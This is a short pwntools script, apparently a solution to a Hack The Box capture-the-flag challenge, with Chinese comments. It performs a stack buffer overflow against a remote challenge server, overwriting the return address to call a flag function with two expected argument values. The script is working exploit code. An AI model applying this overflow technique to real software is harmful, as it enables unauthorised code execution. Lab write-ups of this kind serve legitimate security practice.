import pwn

# conn = pwn.process('./vuln')
conn = pwn.remote('docker.hackthebox.eu', 30638)
print(conn.recvline())
ss = 'a'*(0x9b1c-0x9a60)
ss += pwn.p32(0x080491e2) # flag函数地址，这个地址因为栈溢出而被修改
ss += pwn.p32(0x08049313) # vuln函数地址
ss += pwn.p32(0xdeadbeef) # 在flag函数中会对比[ebp+0x8]
ss += pwn.p32(0xc0ded00d) # 在flag函数中会对比[ebp+0xc]
conn.sendline(ss)
print(conn.recv())
print(conn.recv())
conn.sendline('123')
conn.recvline()